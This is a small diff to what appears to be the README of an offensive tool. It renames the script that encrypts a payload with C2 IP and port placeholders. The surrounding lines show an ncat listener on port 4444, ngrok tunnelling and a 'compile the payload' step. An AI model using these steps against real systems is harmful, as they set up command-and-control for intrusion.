@@ -12,7 +12,7 @@ ncat -nvlkp 4444
 
 Run the encryption script with the desired number of rounds, key length, IP address and Port (must match public IP and PORT opened by ngrok service):
 
-python3 encrypt.py -r <rounds> -k <key_length> -c <C2_IP> -p <C2_PORT> 
+python3 encrypt_command.py -r <rounds> -k <key_length> -c <C2_IP> -p <C2_PORT> 
 
 2. Compile the payload
 
